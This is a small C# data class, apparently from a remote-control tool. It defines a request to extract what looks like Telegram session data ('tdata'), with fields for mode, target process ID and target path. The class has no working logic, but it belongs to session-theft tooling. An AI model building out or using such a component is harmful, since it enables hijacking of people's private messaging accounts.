using System;

namespace RemoteControl.Protocals.Request
{
    public class RequestTGExtract
    {
        /// <summary>
        /// 提取模式: 0=session复制, 1=完整tdata, 2=仅扫描进程
        /// </summary>
        public int Mode = 0;

        /// <summary>
        /// 按PID提取时的目标PID
        /// </summary>
        public int TargetPid = 0;

        /// <summary>
        /// 按路径提取时的目标路径
        /// </summary>
        public string TargetPath = "";
    }
}
